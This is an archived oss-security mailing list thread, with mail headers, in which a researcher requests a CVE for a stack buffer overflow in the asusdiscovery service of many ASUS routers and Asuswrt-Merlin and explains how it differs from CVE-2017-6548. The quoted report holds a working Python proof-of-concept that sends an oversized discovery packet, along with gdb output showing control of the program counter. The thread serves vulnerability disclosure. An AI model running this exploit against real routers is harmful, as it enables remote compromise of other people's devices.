X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6040" "Friday" "14" "July" "2017" "10:51:29" "+0800" "varsleak" "varsleak@gmail.com" "<c3e46525-fa16-529b-ffde-78ea54fc972e@gmail.com>" "174" "Re: [oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability" nil nil nil "7" "2017071402:51:29" "[oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability" (number mark "U       varsleak@gma Jul 14  174/6040  " thread-indent "\"Re: [oss-security] CVE-IDs request for ASUS wiress router Remote Command/Code Execution Vulnerability\"\n") "<3ad6bf17-b508-db0f-4294-e13a094d9226@trylinux.us>" ("<eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>" "<3ad6bf17-b508-db0f-4294-e13a094d9226@trylinux.us>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 14054 invoked by uid 550); 14 Jul 2017 09:19:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 31979 invoked from network); 14 Jul 2017 02:51:46 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=subject:to:references:from:message-id:date:user-agent:mime-version
         :in-reply-to:content-language:content-transfer-encoding;
        bh=eila7aK4pFwgE4IA/DBzzCIpjmOIu74gBeRqocaQU2Q=;
        b=icqpn91XSun++viKBDLZZ+FmDB/NDVZTGhBA5DbeAQS13qmJyU+zi0UFNqRojzt7KR
         fYOtlOJeeyxPSsmEn/IEO45seixjG4P243tmfFAEbkQTwcPwwhvwBhFOaI12xtL7lyGa
         YJz45NscDZZTS4VwkjOvxPwAS1xvMOj6ECVTXvxEHkFKyejvQ07VtO42vny6/FxgIpa/
         qMbqQZACjYfqDpayQBbv8seCsI5NuYjX3C9Fz2p+Tn+yGVvudihvGUZrZ9XQPy1BJFyk
         lj75MVngxNKfqi9cAQFhiwmic8WLe/ZMkGnnnZiW+TqdNuhKQZ7ZFiVuYyK+w9pDt/R5
         Eorw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:subject:to:references:from:message-id:date
         :user-agent:mime-version:in-reply-to:content-language
         :content-transfer-encoding;
        bh=eila7aK4pFwgE4IA/DBzzCIpjmOIu74gBeRqocaQU2Q=;
        b=exODeNgPIwFm1nO9Q89t0lMnPMagcChaBg/hVXRLl7SD3xPxls0K1S8LtL9L11gZAc
         ciE2J6IR8qlVan+8Sx4u1YXdii684zCeF9MUdkwZv9ZD7PJ5FTfqGh5yPxK0s+yphGbv
         KHwwNVR5yIPdGrNGVow9ciXt6dswVT5PT+i/2v2pIyxvc6agEgqXx81b0ap7a5zXEit4
         XphtIb1IfPPZJHlsW66yfi48vE9mRnmp7CBUHn39UujpECFM6W5OAXsb2nmHxpn9lQ8D
         GHEC9+cgfwX3IQrbNXHP2aWQ+36Df8M0Xio6slvwcY8S/1YIHXUrLLkT+i+SzjrAGkGp
         BTJA==
X-Gm-Message-State: AIVw111ELhfJl0yHTMnQonUvwbZdzWoGXmuYLi8nIuHLb+iQEPbf3kF0
	Ht/A0kedPO1eqajKZ3o=
X-Received: by 10.98.150.135 with SMTP id s7mr2904573pfk.172.1500000694431;
        Thu, 13 Jul 2017 19:51:34 -0700 (PDT)
To: Zach W <kestrel@trylinux.us>, oss-security@lists.openwall.com
References: <eb6ec6e6-16b6-e155-d536-d2355d4afdd9@gmail.com>
 <3ad6bf17-b508-db0f-4294-e13a094d9226@trylinux.us>
From: varsleak <varsleak@gmail.com>
Message-ID: <c3e46525-fa16-529b-ffde-78ea54fc972e@gmail.com>
Date: Fri, 14 Jul 2017 10:51:29 +0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.2.1
MIME-Version: 1.0
In-Reply-To: <3ad6bf17-b508-db0f-4294-e13a094d9226@trylinux.us>
Content-Type: text/plain; charset=gbk
Content-Language: en-US
Content-Transfer-Encoding: 8bit
Subject: Re: [oss-security] CVE-IDs request for ASUS wiress router Remote
 Command/Code Execution Vulnerability

They are of course different, CVE-2017-6548 vulnerability code is
located in the networkmap service routine, and I found the vulnerability
in the asusdiscorvery service program.

在 2017年07月14日 02:39, Zach W 写道:
> How is this different from CVE-2017-6548?
> 
> Zach W.
> 
> 
> On 7/12/17 7:57 PM, varsleak wrote:
>> Hello, I review the source of asuswrt-merlin and found a Remote
>> Command/Code Execution, the detail as follows:
>>
>>
>> 1. Vulnerability Details
>>      Affected Vendor:RT-AC5300,RT_AC1900P,RT-AC68U,RT-AC68P,RT-AC88U,
>>      RT-AC66U,RT-AC66U_B1,RT-AC58U,RT-AC56U,RT-AC55U,RT-AC52U,RT-AC51U,
>>      RT-N18U,RT-N66U,RT-N56U,RT-AC3200,RT-AC3100,RT_AC1200GU,
>>      RT_AC1200G,RT-AC1200,RT-AC53,RT-N12HP,RT-N12HP_B1,RT-N12D1,
>>      RT-N12+,RT_N12+_PRO,RT-N16,RT-N300
>>      and Asuswrt-Merlin(https://github.com/RMerl/asuswrt-merlin)
>>      Affected Product: ASUS Wiress Router
>>      Affected Version:  all the latest firmware
>>      Platform: router
>>      Impact: Remote Command/Code Execution
>>      Attack vector: asusdiscorvery service
>>
>> 2. Vulnerability Description
>>      When an ASUS router discovers another router device,
>>      it does not buffer the size of all discovered devices
>>      when it is added to the device list to cause a stack overflow,
>>      resulting in a remote code/command execution vulnerability.
>>      The vulnerability code is as follows:
>>
>> https://github.com/RMerl/asuswrt-merlin/blob/master/release/src/router/networkmap/ASUS_Discovery.c#L184-L202
>>
>> 3. PoC:
>> <<<EOF
>> # coding=utf-8
>>
>> import time
>> import socket
>> import sys
>> import os
>> import threading
>> import struct
>> import random
>> import time
>> ''' Please run PoC first, and it must run on windows '''
>> class ASUSDiscoveryBufferOverflow:
>> 	""" set remote host and remote port to use exp """
>> 	def __init__(self, RHOST, RPORT, LHOST):
>> 		self.RHOST = RHOST
>> 		self.RPORT = RPORT
>> 		self.LHOST = LHOST
>> 	
>> 	def exploit(self):
>> 		""" execute exploit """
>> 		self.searchDevice()
>> 		self.sentShellCode()
>> 		
>> 	def searchDevice(self, socket_prot = socket.IPPROTO_UDP):
>> 		""" search ASUS Discovery packet """
>> 		print("    [-] try to search ASUS Discovery packet")
>> 		while(True):
>> 			sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_prot)
>> 			sniffer.bind((self.LHOST, 0))
>> 			sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
>> 			if os.name == 'nt':
>> 				sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
>>
>> 			pkt, hosts = sniffer.recvfrom(65565)
>> 			
>> 			if self.RHOST == hosts[0] and '\x11' == pkt[9]:
>> 				if (pkt[28] == '\x0C' and
>> 				pkt[29] == '\x15' and
>> 				pkt[30] == '\x1F' ):
>> 					print("    [+] bingo!")
>> 					break
>>
>> 	def sentShellCode(self):
>> 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
>> 		
>> 		for i in range(15):
>> 			s.sendto(self.makeShellCode(), (self.RHOST, self.RPORT))
>> 			print(" [-] sent %d cycle" % (i + 1))
>> 			time.sleep(0.2)
>> 	
>> 	def generatingRandomMacAddr(self):
>> 		tmp1 = random.randint(0, 0xff)
>> 		tmp2 = random.randint(0, 0xff)
>> 		tmp3 = random.randint(0, 0xff)
>> 		tmp4 = random.randint(0, 0xff)
>> 		tmp5 = random.randint(0, 0xff)
>> 		tmp6 = random.randint(0, 0xff)
>> 		return struct.pack('6B', \
>> 			tmp1, tmp2, tmp3, tmp4, tmp5, tmp6)
>> 			
>> 	def makeShellCode(self):	
>> 		shellcode = "\x0c\x16\x1f\x00" # HEADER [ PLEASE NOT MODIFY ]
>> 		shellcode += (128 * b'A') # PKT_GET_INFO.PrinterInfo
>> 		shellcode += (32 * b'A')  # PKT_GET_INFO.SSID
>> 		shellcode += (32 * b'A')  # PKT_GET_INFO.NetMask
>> 		shellcode += (32 * b'A')  # PKT_GET_INFO.ProductID
>> 		shellcode += (16 * b'A')  # PKT_GET_INFO.FirmwareVersion
>> 		shellcode += b'A'		 # PKT_GET_INFO.OperationMode
>> 		shellcode += self.generatingRandomMacAddr() # PKT_GET_INFO.MacAddress	
>> 		shellcode += (261 * b'A') #
>>
>> 		return shellcode
>> 		
>> def main():
>> 	poc = ASUSDiscoveryBufferOverflow('192.168.2.1', 9999, '127.0.0.1')
>> 	
>> 	print("[+] Try to use exploit ...")
>> 	
>> 	poc.exploit()
>> 	
>> 	print("[+] use exploit sucessful.")
>>
>> if __name__ == '__main__':
>> 	main()
>> EOF;
>>
>> 4. gdb trace
>> admin@RT-N12HP_B1:/tmp/bin# gdb /usr/sbin/asusdiscovery
>>
>> GNU gdb 6.8
>> Copyright (C) 2008 Free Software Foundation, Inc.
>> License GPLv3+: GNU GPL version 3 or later
>> <http://gnu.org/licenses/gpl.html>
>> This is free software: you are free to change and redistribute it.
>> There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
>> and "show warranty" for details.
>> This GDB was configured as "mipsel-linux"...
>> I'm sorry, Dave, I can't do that.  Symbol format `elf32-tradlittlemips'
>> unknown.
>> (gdb) r
>> Starting program: /usr/sbin/asusdiscovery
>>
>> Program received signal SIGSEGV, Segmentation fault.
>> 0x41414141 in ?? ()
>> (gdb) info r
>>           zero       at       v0       v1       a0       a1       a2
>>   a3
>>  R0   00000000 00000000 303e3134 00423a80 7fd650e8 00000001 00001000
>> 00423a80
>>             t0       t1       t2       t3       t4       t5       t6
>>   t7
>>  R8   00423000 00423000 00000581 3a31343a 41414141 2ab89124 41414141
>> 2ab0fe10
>>             s0       s1       s2       s3       s4       s5       s6
>>   s7
>>  R16  41414141 41414141 41414141 41414141 41414141 41414141 41414141
>> 41413e41
>>             t8       t9       k0       k1       gp       sp       s8
>>   ra
>>  R24  00000014 2ab6ad70 7fd65f66 00000000 0041c050 7fd65d30 41414141
>> 41414141
>>         status       lo       hi badvaddr    cause       pc
>>       01009c13 0000035d 00000070 41414140 00000008 41414141
>>           fcsr      fir  restart
>>       00000000 00000000 00000000
>>
>> As we have seen, the registers s0-s8,t4,t6,ra and pc are overwritten by
>> 0x41.
>>
>> Finally, with the ROP can lead to Remote Command Execution.
>>
>> 5. Discover
>>     varsleak of Sichuan Silent Information Technology Co., Ltd
>>     company website: http://www.silence.com.cn/
> 
